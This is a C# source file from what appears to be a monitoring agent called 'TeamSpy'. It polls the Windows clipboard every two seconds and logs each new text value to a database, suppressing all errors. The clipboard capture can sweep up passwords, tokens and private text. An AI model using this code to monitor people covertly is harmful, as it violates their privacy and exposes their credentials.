using System;
using System.Threading;
using System.Windows;

namespace TeamSpy.Agent
{
    public class ClipboardMonitor
    {
        private System.Threading.Timer? _timer;
        private string _lastClipboardText = string.Empty;
        private readonly DatabaseManager _dbManager;

        public ClipboardMonitor(DatabaseManager dbManager)
        {
            _dbManager = dbManager;
        }

        public void Start()
        {
            Console.WriteLine("Starting Clipboard Monitor...");
            _timer = new System.Threading.Timer(MonitorClipboard, null, 0, 2000); // Check every 2 seconds
        }

        private void MonitorClipboard(object? state)
        {
            try
            {
                string currentClipboardText = GetText();
                if (!string.IsNullOrEmpty(currentClipboardText) && currentClipboardText != _lastClipboardText)
                {
                    _dbManager.LogClipboardChange(DateTime.Now, currentClipboardText);
                    _lastClipboardText = currentClipboardText;
                }
            }
            catch (Exception) { /* Ignore exceptions */ }
        }

        public void Stop()
        {
            _timer?.Change(Timeout.Infinite, 0);
            Console.WriteLine("Stopped Clipboard Monitor.");
        }

        private string GetText()
        {
            string clipboardText = string.Empty;
            Thread staThread = new Thread(() =>
            {
                try
                {
                    if (System.Windows.Clipboard.ContainsText())
                    {
                        clipboardText = System.Windows.Clipboard.GetText();
                    }
                }
                catch (Exception) { /* Ignore */ }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
            return clipboardText;
        }
    }
}
